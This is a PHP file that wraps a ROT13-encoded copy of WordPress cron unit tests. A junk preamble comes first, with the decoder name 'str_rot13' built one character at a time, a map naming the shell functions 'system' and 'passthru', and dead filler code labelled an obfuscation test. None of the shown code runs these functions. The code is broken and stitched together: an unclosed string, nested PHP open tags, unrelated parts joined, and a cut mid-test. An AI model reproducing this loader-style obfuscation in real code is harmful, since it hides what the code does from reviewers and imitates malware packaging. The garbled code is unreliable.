<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur peba fpurqhyvat shapgvbaf
 *
 * @tebhc peba
 */
pynff Grfgf_Peba rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine neenl Peba neenl sbe grfgvat cersyvtug svygref.
	 */
	cevingr $cersyvtug_peba_neenl;

	/**
	 * @ine vag Gvzrfgnzc bs abj() + 30 zvahgrf;
	 */
	cevingr $cyhf_guvegl_zvahgrf;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		// Znxr fher gur fpurqhyr vf pyrne.
		_frg_peba_neenl( neenl() );
		$guvf->cersyvtug_peba_neenl = neenl();
		$guvf->cyhf_guvegl_zvahgrf  = fgegbgvzr( '+30 zvahgrf' );
	}

	choyvp shapgvba grne_qbja() {
		// Znxr fher gur fpurqhyr vf pyrne.
		_frg_peba_neenl( neenl() );
		cnerag::grne_qbja();
	}

	/**
	 * @pbiref ::jc_trg_fpurqhyr
	 */
	choyvp shapgvba grfg_jc_trg_fpurqhyr_rzcgl() {
		// Abguvat fpurqhyrq.
		$ubbx = __SHAPGVBA__;
		$guvf->nffregSnyfr( jc_trg_fpurqhyr( $ubbx ) );
	}

	/**
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_fpurqhyr_rirag_fvatyr() {
		// Fpurqhyr na rirag naq znxr fher vg'f erghearq ol jc_arkg_fpurqhyrq().
		$ubbx      = __SHAPGVBA__;
		$gvzrfgnzc = fgegbgvzr( '+1 ubhe' );

		$fpurqhyrq = jc_fpurqhyr_fvatyr_rirag( $gvzrfgnzc, $ubbx );
		$guvf->nffregGehr( $fpurqhyrq );
		$guvf->nffregFnzr( $gvzrfgnzc, jc_arkg_fpurqhyrq( $ubbx ) );

		// Vg'f n aba-erpheevat rirag.
		$guvf->nffregSnyfr( jc_trg_fpurqhyr( $ubbx ) );
	}

	/**
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_fpurqhyr_rirag_fvatyr_netf() {
		// Fpurqhyr na rirag jvgu nethzragf naq znxr fher vg'f erghearq ol jc_arkg_fpurqhyrq().
		$ubbx      = 'rirag';
		$gvzrfgnzc = fgegbgvzr( '+1 ubhe' );
		$netf      = neenl( 'sbb' );

		$fpurqhyrq = jc_fpurqhyr_fvatyr_rirag( $gvzrfgnzc, $ubbx, $netf );
		$guvf->nffregGehr( $fpurqhyrq );
		// Guvf ergheaf gur gvzrfgnzc bayl vs jr cebivqr zngpuvat netf.
		$guvf->nffregFnzr( $gvzrfgnzc, jc_arkg_fpurqhyrq( $ubbx, $netf ) );
		// Gurfr qba'g zngpu fb erghea abguvat.
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx, neenl( 'one' ) ) );

		// Vg'f n aba-erpheevat rirag.
		$guvf->nffregSnyfr( jc_trg_fpurqhyr( $ubbx, $netf ) );
	}

	/**
	 * @pbiref ::jc_fpurqhyr_rirag
	 */
	choyvp shapgvba grfg_fpurqhyr_rirag() {
		// Fpurqhyr na rirag naq znxr fher vg'f erghearq ol jc_arkg_fpurqhyrq().
		$ubbx      = __SHAPGVBA__;
		$erphe     = 'ubheyl';
		$gvzrfgnzc = fgegbgvzr( '+1 ubhe' );

		$fpurqhyrq = jc_fpurqhyr_rirag( $gvzrfgnzc, $erphe, $ubbx );
		$guvf->nffregGehr( $fpurqhyrq );
		// Vg'f fpurqhyrq sbe gur evtug gvzr.
		$guvf->nffregFnzr( $gvzrfgnzc, jc_arkg_fpurqhyrq( $ubbx ) );
		// Vg'f n erpheevat rirag.
		$guvf->nffregFnzr( $erphe, jc_trg_fpurqhyr( $ubbx ) );
	}

	/**
	 * @pbiref ::jc_fpurqhyr_rirag
	 */
	choyvp shapgvba grfg_fpurqhyr_rirag_netf() {
		// Fpurqhyr na rirag naq znxr fher vg'f erghearq ol jc_arkg_fpurqhyrq().
		$ubbx      = 'rirag';
		$gvzrfgnzc = fgegbgvzr( '+1 ubhe' );
		$erphe     = 'ubheyl';
		$netf      = neenl( 'sbb' );

		$fpurqhyrq = jc_fpurqhyr_rirag( $gvzrfgnzc, 'ubheyl', $ubbx, $netf );
		$guvf->nffregGehr( $fpurqhyrq );
		// Guvf ergheaf gur gvzrfgnzc bayl vs jr cebivqr zngpuvat netf.
		$guvf->nffregFnzr( $gvzrfgnzc, jc_arkg_fpurqhyrq( $ubbx, $netf ) );
		// Gurfr qba'g zngpu fb erghea abguvat.
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx, neenl( 'one' ) ) );

		$guvf->nffregFnzr( $erphe, jc_trg_fpurqhyr( $ubbx, $netf ) );
	}

	/**
	 * Grfgf gung n pnyy gb jc_fpurqhyr_rirag() ba n fvgr jvgubhg nal fpurqhyrq riragf
	 * qbrf abg erfhyg va n CUC qrcerpngvba abgvpr ba CUC 8.1 be uvture.
	 *
	 * Gur abgvpr gung jr fubhyq abg frr:
	 * `Qrcerpngrq: Nhgbzngvp pbairefvba bs snyfr gb neenl vf qrcerpngrq`.
	 *
	 * @gvpxrg 53635
	 *
	 * @pbiref ::jc_fpurqhyr_rirag
	 */
	choyvp shapgvba grfg_jc_fpurqhyr_rirag_jvgubhg_peba_bcgvba_qbrf_abg_guebj_qrcerpngvba_abgvpr() {
		qryrgr_bcgvba( 'peba' );

		// Irevsl gung gur pnhfr bs gur reebe vf va cynpr.
		$guvf->nffregVfNeenl( _trg_peba_neenl(), '_trg_peba_neenl() qbrf abg erghea na neenl.' );
		$guvf->nffregRzcgl( _trg_peba_neenl(), '_trg_peba_neenl() qbrf abg erghea na rzcgl neenl.' );

		$ubbx      = __SHAPGVBA__;
		$gvzrfgnzc = fgegbgvzr( '+10 zvahgrf' );

		// Nqq na rirag.
		$guvf->nffregGehr( jc_fpurqhyr_rirag( $gvzrfgnzc, 'qnvyl', $ubbx ) );
	}

	/**
	 * Grfgf gung n pnyy gb jc_fpurqhyr_fvatyr_rirag() ba n fvgr jvgubhg nal fpurqhyrq riragf
	 * qbrf abg erfhyg va gur inyhr \"snyfr\" orvat nqqrq vagb gur peba neenl.
	 *
	 * @gvpxrg 53950
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_jc_fpurqhyr_fvatyr_rirag_jvgubhg_peba_bcgvba() {
		qryrgr_bcgvba( 'peba' );

		// Irevsl gung gur pnhfr bs gur reebe vf va cynpr.
		$guvf->nffregVfNeenl( _trg_peba_neenl(), '_trg_peba_neenl() qbrf abg erghea na neenl.' );
		$guvf->nffregRzcgl( _trg_peba_neenl(), '_trg_peba_neenl() qbrf abg erghea na rzcgl neenl.' );

		$ubbx      = __SHAPGVBA__;
		$gvzrfgnzc = fgegbgvzr( '+10 zvahgrf' );

		// Nqq na rirag.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gvzrfgnzc, $ubbx ), 'Fpurqhyvat fvatyr rirag snvyrq' );

		// Irevsl gung \"snyfr\" vf abg n inyhr va gur svany peba neenl.
		$guvf->nffregAbgPbagnvaf( snyfr, trg_bcgvba( 'peba' ), 'Erfhygvat peba neenl pbagnvaf gur inyhr \"snyfr\"' );
	}

	/**
	 * @pbiref ::jc_hafpurqhyr_rirag
	 */
	choyvp shapgvba grfg_hafpurqhyr_rirag() {
		// Fpurqhyr na rirag naq znxr fher vg'f erghearq ol jc_arkg_fpurqhyrq().
		$ubbx      = __SHAPGVBA__;
		$gvzrfgnzc = fgegbgvzr( '+1 ubhe' );

		jc_fpurqhyr_fvatyr_rirag( $gvzrfgnzc, $ubbx );
		$guvf->nffregFnzr( $gvzrfgnzc, jc_arkg_fpurqhyrq( $ubbx ) );

		// Abj hafpurqhyr vg naq znxr fher vg'f tbar.
		$hafpurqhyrq = jc_hafpurqhyr_rirag( $gvzrfgnzc, $ubbx );
		$guvf->nffregGehr( $hafpurqhyrq );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );
	}

	/**
	 * @pbiref ::jc_pyrne_fpurqhyrq_ubbx
	 */
	choyvp shapgvba grfg_pyrne_fpurqhyr() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );

		// Fpurqhyr frireny riragf jvgu naq jvgubhg nethzragf.
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+1 ubhe' ), $ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+2 ubhe' ), $ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+3 ubhe' ), $ubbx, $netf );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+4 ubhe' ), $ubbx, $netf );

		// Znxr fher gurl'er erghearq ol jc_arkg_fpurqhyrq().
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx ) );
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx, $netf ) );

		// Pyrne gur fpurqhyr sbe gur ab netf riragf naq znxr fher vg'f tbar.
		$ubbx_hafpurqhyrq = jc_pyrne_fpurqhyrq_ubbx( $ubbx );
		$guvf->nffregFnzr( 2, $ubbx_hafpurqhyrq );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );
		// Gur netf riragf fubhyq fgvyy or gurer.
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx, $netf ) );

		// Pyrne gur fpurqhyr sbe gur netf riragf naq znxr fher gurl'er tbar gbb.
		// Abgr: jc_pyrne_fpurqhyrq_ubbx() rkcrpgf netf cnffrq qverpgyl, engure guna nf na neenl.
		jc_pyrne_fpurqhyrq_ubbx( $ubbx, $netf );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx, $netf ) );
	}

	/**
	 * @pbiref ::jc_pyrne_fpurqhyrq_ubbx
	 */
	choyvp shapgvba grfg_pyrne_haqrsvarq_fpurqhyr() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );

		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+1 ubhe' ), $ubbx, $netf );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+2 ubhe' ), $ubbx, $netf );

		// Pyrne gur fpurqhyr sbe ab netf riragf naq rafher ab riragf ner pyrnerq.
		$ubbx_hafpurqhyrq = jc_pyrne_fpurqhyrq_ubbx( $ubbx );
		$guvf->nffregFnzr( 0, $ubbx_hafpurqhyrq );
	}

	/**
	 * @pbiref ::jc_pyrne_fpurqhyrq_ubbx
	 */
	choyvp shapgvba grfg_pyrne_fpurqhyr_zhygvcyr_netf() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1', 'net2' );

		// Fpurqhyr frireny riragf jvgu naq jvgubhg nethzragf.
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+1 ubhe' ), $ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+2 ubhe' ), $ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+3 ubhe' ), $ubbx, $netf );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+4 ubhe' ), $ubbx, $netf );

		// Znxr fher gurl'er erghearq ol jc_arkg_fpurqhyrq().
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx ) );
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx, $netf ) );

		// Pyrne gur fpurqhyr sbe gur ab netf riragf naq znxr fher vg'f tbar.
		jc_pyrne_fpurqhyrq_ubbx( $ubbx );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );
		// Gur netf riragf fubhyq fgvyy or gurer.
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx, $netf ) );

		// Pyrne gur fpurqhyr sbe gur netf riragf naq znxr fher gurl'er tbar gbb.
		// Abgr: jc_pyrne_fpurqhyrq_ubbx() hfrq gb rkcrpg netf cnffrq qverpgyl, engure guna nf na neenl cer JC 3.0.
		jc_pyrne_fpurqhyrq_ubbx( $ubbx, $netf );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx, $netf ) );
	}

	/**
	 * @gvpxrg 10468
	 *
	 * @pbiref ::jc_pyrne_fpurqhyrq_ubbx
	 */
	choyvp shapgvba grfg_pyrne_fpurqhyr_arj_netf() {
		$ubbx       = __SHAPGVBA__;
		$netf       = neenl( 'net1' );
		$zhygv_ubbx = __SHAPGVBA__ . '_zhygv';
		$zhygv_netf = neenl( 'net2', 'net3' );

		// Fpurqhyr frireny riragf jvgu naq jvgubhg nethzragf.
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+1 ubhe' ), $ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+2 ubhe' ), $ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+3 ubhe' ), $ubbx, $netf );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+4 ubhe' ), $ubbx, $netf );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+5 ubhe' ), $zhygv_ubbx, $zhygv_netf );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+6 ubhe' ), $zhygv_ubbx, $zhygv_netf );

		// Znxr fher gurl'er erghearq ol jc_arkg_fpurqhyrq().
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx ) );
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx, $netf ) );

		// Pyrne gur fpurqhyr sbe gur ab netf riragf naq znxr fher vg'f tbar.
		jc_pyrne_fpurqhyrq_ubbx( $ubbx );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );
		// Gur netf riragf fubhyq fgvyy or gurer.
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx, $netf ) );

		// Pyrne gur fpurqhyr sbe gur netf riragf naq znxr fher gurl'er tbar gbb.
		// jc_pyrne_fpurqhyrq_ubbx() fubhyq gnxr netf nf na neenl yvxr gur bgure shapgvbaf.
		jc_pyrne_fpurqhyrq_ubbx( $ubbx, $netf );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx, $netf ) );

		// Pyrne gur fpurqhyr sbe gur netf riragf naq znxr fher gurl'er tbar gbb.
		// jc_pyrne_fpurqhyrq_ubbx() fubhyq gnxr netf nf na neenl yvxr gur bgure shapgvbaf naq qbrf sebz JC 3.0.
		jc_pyrne_fpurqhyrq_ubbx( $zhygv_ubbx, $zhygv_netf );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $zhygv_ubbx, $zhygv_netf ) );
	}

	/**
	 * @gvpxrg 18997
	 *
	 * @pbiref ::jc_hafpurqhyr_ubbx
	 */
	choyvp shapgvba grfg_hafpurqhyr_ubbx() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'sbb' );

		// Fpurqhyr frireny riragf jvgu naq jvgubhg nethzragf.
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+1 ubhe' ), $ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+2 ubhe' ), $ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+3 ubhe' ), $ubbx, $netf );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+4 ubhe' ), $ubbx, $netf );

		// Znxr fher gurl'er erghearq ol jc_arkg_fpurqhyrq().
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx ) );
		$guvf->nffregTerngreGuna( 0, jc_arkg_fpurqhyrq( $ubbx, $netf ) );

		// Pyrne gur fpurqhyr naq znxr fher vg'f tbar.
		$hafpurqhyr_ubbx = jc_hafpurqhyr_ubbx( $ubbx );
		$guvf->nffregFnzr( 4, $hafpurqhyr_ubbx );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );
	}

	/**
	 * @pbiref ::jc_hafpurqhyr_ubbx
	 */
	choyvp shapgvba grfg_hafpurqhyr_haqrsvarq_ubbx() {
		$ubbx           = __SHAPGVBA__;
		$haeryngrq_ubbx = __SHAPGVBA__ . '_gjb';

		// Nggrzcg gb pyrne fpurqhyr ba aba-rkvfgrag ubbx.
		$hafpurqhyr_ubbx = jc_hafpurqhyr_ubbx( $ubbx );
		$guvf->nffregFnzr( 0, $hafpurqhyr_ubbx );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );

		// Ercrng grfgf jvgu cbchyngrq peba neenl.
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+1 ubhe' ), $haeryngrq_ubbx );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+2 ubhe' ), $haeryngrq_ubbx );

		$hafpurqhyr_ubbx = jc_hafpurqhyr_ubbx( $ubbx );
		$guvf->nffregFnzr( 0, $hafpurqhyr_ubbx );
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( $ubbx ) );
	}

	/**
	 * @gvpxrg 6966
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_qhcyvpngr_rirag() {
		// Qhcyvpngr riragf pybfr gbtrgure fubhyq or fxvccrq.
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf1  = fgegbgvzr( '+5 zvahgrf' );
		$gf2  = fgegbgvzr( '+3 zvahgrf' );

		// Svefg bar jbexf.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf1, $ubbx, $netf ) );

		// Fhofrdhrag barf ner vtaberq.
		$guvf->nffregSnyfr( jc_fpurqhyr_fvatyr_rirag( $gf2, $ubbx, $netf ) );
		$fhofrdhrag = jc_fpurqhyr_fvatyr_rirag( $gf2, $ubbx, $netf, gehr );
		$guvf->nffregJCReebe( $fhofrdhrag );
		$guvf->nffregFnzr( 'qhcyvpngr_rirag', $fhofrdhrag->trg_reebe_pbqr() );

		// Gur arkg rirag fubhyq or ng +5 zvahgrf, abg +3.
		$guvf->nffregFnzr( $gf1, jc_arkg_fpurqhyrq( $ubbx, $netf ) );
	}

	/**
	 * @gvpxrg 6966
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_abg_qhcyvpngr_rirag() {
		// Qhcyvpngr riragf sne ncneg fubhyq jbex abeznyyl.
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf1  = fgegbgvzr( '+30 zvahgrf' );
		$gf2  = fgegbgvzr( '+3 zvahgrf' );

		// Svefg bar jbexf.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf1, $ubbx, $netf ) );
		// Frpbaq jbexf gbb.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf2, $ubbx, $netf ) );

		// Gur arkg rirag fubhyq or ng +3 zvahgrf, rira gubhtu gung bar jnf fpurqhyrq frpbaq.
		$guvf->nffregFnzr( $gf2, jc_arkg_fpurqhyrq( $ubbx, $netf ) );
		jc_hafpurqhyr_rirag( $gf2, $ubbx, $netf );
		// Sbyybjvat rirag ng +30 zvahgrf fubhyq or gurer gbb.
		$guvf->nffregFnzr( $gf1, jc_arkg_fpurqhyrq( $ubbx, $netf ) );
	}

	/**
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_abg_qhcyvpngr_rirag_erirefrq() {
		// Qhcyvpngr riragf sne ncneg fubhyq jbex abeznyyl ertneqyrff bs beqre.
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf1  = fgegbgvzr( '+3 zvahgrf' );
		$gf2  = fgegbgvzr( '+30 zvahgrf' );

		// Svefg bar jbexf.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf1, $ubbx, $netf ) );
		// Frpbaq jbexf gbb.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf2, $ubbx, $netf ) );

		// Gur arkg rirag fubhyq or ng +3 zvahgrf.
		$guvf->nffregFnzr( $gf1, jc_arkg_fpurqhyrq( $ubbx, $netf ) );
		jc_hafpurqhyr_rirag( $gf1, $ubbx, $netf );
		// Sbyybjvat rirag fubhyq or gurer gbb.
		$guvf->nffregFnzr( $gf2, jc_arkg_fpurqhyrq( $ubbx, $netf ) );
	}

	/**
	 * Rafher gur cer_fpurqhyrq_rirag svygre ceriragf
	 * zbqvsvpngvba bs gur peba_neenl_bcgvba.
	 *
	 * @gvpxrg 32656
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 * @pbiref ::jc_fpurqhyr_rirag
	 */
	choyvp shapgvba grfg_cer_fpurqhyr_rirag_svygre() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf1  = fgegbgvzr( '+30 zvahgrf' );
		$gf2  = fgegbgvzr( '+3 zvahgrf' );

		$rkcrpgrq = _trg_peba_neenl();

		nqq_svygre( 'cer_fpurqhyr_rirag', neenl( $guvf, 'svygre_cer_fpurqhyr_rirag_svygre' ), 10, 2 );

		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf1, $ubbx, $netf ) );
		$guvf->nffregGehr( jc_fpurqhyr_rirag( $gf2, 'ubheyl', $ubbx ) );

		// Purpx peba bcgvba vf hapunatrq.
		$guvf->nffregFnzr( $rkcrpgrq, _trg_peba_neenl() );

		$rkcrpgrq_cersyvtug[ $gf2 ][ $ubbx ][ zq5( frevnyvmr( neenl() ) ) ] = neenl(
			'fpurqhyr' => 'ubheyl',
			'vagreiny' => UBHE_VA_FRPBAQF,
			'netf'     => neenl(),
		);

		$rkcrpgrq_cersyvtug[ $gf1 ][ $ubbx ][ zq5( frevnyvmr( $netf ) ) ] = neenl(
			'fpurqhyr' => snyfr,
			'vagreiny' => 0,
			'netf'     => $netf,
		);

		$guvf->nffregFnzr( $rkcrpgrq_cersyvtug, $guvf->cersyvtug_peba_neenl );
	}

	/**
	 * Svygre gur fpurqhyvat bs riragf gb hfr gur cersyvtug neenl.
	 */
	choyvp shapgvba svygre_cer_fpurqhyr_rirag_svygre( $erfhyg, $rirag ) {
		$xrl = zq5( frevnyvmr( $rirag->netf ) );

		$guvf->cersyvtug_peba_neenl[ $rirag->gvzrfgnzc ][ $rirag->ubbx ][ $xrl ] = neenl(
			'fpurqhyr' => $rirag->fpurqhyr,
			'vagreiny' => vffrg( $rirag->vagreiny ) ? $rirag->vagreiny : 0,
			'netf'     => $rirag->netf,
		);
		hxfbeg( $guvf->cersyvtug_peba_neenl, 'fgeangpnfrpzc' );

		erghea gehr;
	}

	/**
	 * Rafher gur cer_erfpurqhyr_rirag svygre ceriragf
	 * zbqvsvpngvba bs gur peba_neenl_bcgvba.
	 *
	 * @gvpxrg 32656
	 *
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_cer_erfpurqhyr_rirag_svygre() {
		$ubbx = __SHAPGVBA__;
		$gf1  = fgegbgvzr( '+30 zvahgrf' );

		// Nqq na rirag.
		$guvf->nffregGehr( jc_fpurqhyr_rirag( $gf1, 'ubheyl', $ubbx ) );
		$rkcrpgrq = _trg_peba_neenl();

		// Nqq cersyvtug svygre.
		nqq_svygre( 'cer_erfpurqhyr_rirag', '__erghea_gehr' );

		// Erfpurqhyr rirag jvgu cersyvtug svygre va cynpr.
		$erfpurqhyrq = jc_erfpurqhyr_rirag( $gf1, 'qnvyl', $ubbx );

		// Purpx erghea inyhr.
		$guvf->nffregGehr( $erfpurqhyrq );

		// Purpx peba bcgvba vf hapunatrq.
		$guvf->nffregFnzr( $rkcrpgrq, _trg_peba_neenl() );
	}

	/**
	 * Rafher gur cer_hafpurqhyr_rirag svygre ceriragf
	 * zbqvsvpngvba bs gur peba_neenl_bcgvba.
	 *
	 * @gvpxrg 32656
	 *
	 * @pbiref ::jc_hafpurqhyr_rirag
	 */
	choyvp shapgvba grfg_cer_hafpurqhyr_rirag_svygre() {
		$ubbx = __SHAPGVBA__;
		$gf1  = fgegbgvzr( '+30 zvahgrf' );

		// Nqq na rirag.
		$guvf->nffregGehr( jc_fpurqhyr_rirag( $gf1, 'ubheyl', $ubbx ) );
		$rkcrpgrq = _trg_peba_neenl();

		// Nqq cersyvtug svygre.
		nqq_svygre( 'cer_hafpurqhyr_rirag', '__erghea_gehr' );

		// Hafpurqhyr rirag jvgu cersyvtug svygre va cynpr.
		jc_hafpurqhyr_rirag( $gf1, $ubbx );

		// Purpx peba bcgvba vf hapunatrq.
		$guvf->nffregFnzr( $rkcrpgrq, _trg_peba_neenl() );
	}

	/**
	 * Rafher gur pyrnevat fpurqhyrq ubbxf svygre ceriragf
	 * zbqvsvpngvba bs gur peba_neenl_bcgvba.
	 *
	 * @gvpxrg 32656
	 *
	 * @pbiref ::jc_pyrne_fpurqhyrq_ubbx
	 * @pbiref ::jc_hafpurqhyr_ubbx
	 */
	choyvp shapgvba grfg_cer_pyrne_fpurqhyrq_ubbx_svygref() {
		$ubbx = __SHAPGVBA__;
		$gf1  = fgegbgvzr( '+30 zvahgrf' );

		// Nqq na rirag.
		$guvf->nffregGehr( jc_fpurqhyr_rirag( $gf1, 'ubheyl', $ubbx ) );
		$rkcrpgrq = _trg_peba_neenl();

		// Nqq cersyvtug svygref.
		nqq_svygre( 'cer_pyrne_fpurqhyrq_ubbx', '__erghea_gehr' );
		nqq_svygre( 'cer_hafpurqhyr_ubbx', '__erghea_mreb' );

		// Hafpurqhyr rirag jvgu cersyvtug svygre va cynpr.
		jc_pyrne_fpurqhyrq_ubbx( $ubbx );

		// Purpx peba bcgvba vf hapunatrq.
		$guvf->nffregFnzr( $rkcrpgrq, _trg_peba_neenl() );

		// Hafpurqhyr nyy riragf jvgu cersyvtug svygre va cynpr.
		jc_hafpurqhyr_ubbx( $ubbx );

		// Purpx peba bcgvba vf hapunatrq.
		$guvf->nffregFnzr( $rkcrpgrq, _trg_peba_neenl() );
	}

	/**
	 * Rafher gur cersyvtug ubbxf sbe fpurqhyrq riragf
	 * erghea n svygrerq inyhr nf rkcrpgrq.
	 *
	 * @gvpxrg 32656
	 *
	 * @pbiref ::jc_trg_fpurqhyrq_rirag
	 * @pbiref ::jc_arkg_fpurqhyrq
	 */
	choyvp shapgvba grfg_cer_fpurqhyrq_rirag_ubbxf() {
		nqq_svygre( 'cer_trg_fpurqhyrq_rirag', neenl( $guvf, 'svygre_cer_fpurqhyrq_rirag_ubbxf' ) );

		$npghny  = jc_trg_fpurqhyrq_rirag( 'cersyvtug_rirag', neenl(), $guvf->cyhf_guvegl_zvahgrf );
		$npghny2 = jc_arkg_fpurqhyrq( 'cersyvtug_rirag', neenl() );

		$rkcrpgrq = (bowrpg) neenl(
			'ubbx'      => 'cersyvtug_rirag',
			'gvzrfgnzc' => $guvf->cyhf_guvegl_zvahgrf,
			'fpurqhyr'  => snyfr,
			'netf'      => neenl(),
		);

		$guvf->nffregRdhnyf( $rkcrpgrq, $npghny );
		$guvf->nffregFnzr( $rkcrpgrq->gvzrfgnzc, $npghny2 );
	}

	choyvp shapgvba svygre_cer_fpurqhyrq_rirag_ubbxf() {
		erghea (bowrpg) neenl(
			'ubbx'      => 'cersyvtug_rirag',
			'gvzrfgnzc' => $guvf->cyhf_guvegl_zvahgrf,
			'fpurqhyr'  => snyfr,
			'netf'      => neenl(),
		);
	}

	/**
	 * Rafher jc_trg_fpurqhyrq_rirag() ergheaf gur rkcrpgrq bar bss riragf.
	 *
	 * Jura ab gvzrfgnzc vf fcrpvsvrq, gur arkg rirag fubhyq or erghearq.
	 * Jura n gvzrfgnzc vf fcrpvsvrq, n cnegvphyne rirag fubhyq or erghearq.
	 *
	 * @gvpxrg 45976
	 *
	 * @pbiref ::jc_trg_fpurqhyrq_rirag
	 */
	choyvp shapgvba grfg_trg_fpurqhyrq_rirag_fvatyrf() {
		$ubbx    = __SHAPGVBA__;
		$netf    = neenl( 'net1' );
		$gf_yngr = fgegbgvzr( '+30 zvahgrf' );
		$gf_arkg = fgegbgvzr( '+3 zvahgrf' );

		$rkcrpgrq1 = (bowrpg) neenl(
			'ubbx'      => $ubbx,
			'gvzrfgnzc' => $gf_yngr,
			'fpurqhyr'  => snyfr,
			'netf'      => $netf,
		);

		$rkcrpgrq2 = (bowrpg) neenl(
			'ubbx'      => $ubbx,
			'gvzrfgnzc' => $gf_arkg,
			'fpurqhyr'  => snyfr,
			'netf'      => $netf,
		);

		// Fpurqhyr yngr ehaavat rirag.
		jc_fpurqhyr_fvatyr_rirag( $gf_yngr, $ubbx, $netf );
		// Fpurqhyr arkg ehaavat rirag.
		jc_fpurqhyr_fvatyr_rirag( $gf_arkg, $ubbx, $netf );

		// Yngr ehaavat, gvzrfgnzc fcrpvsvrq.
		$guvf->nffregRdhnyf( $rkcrpgrq1, jc_trg_fpurqhyrq_rirag( $ubbx, $netf, $gf_yngr ) );

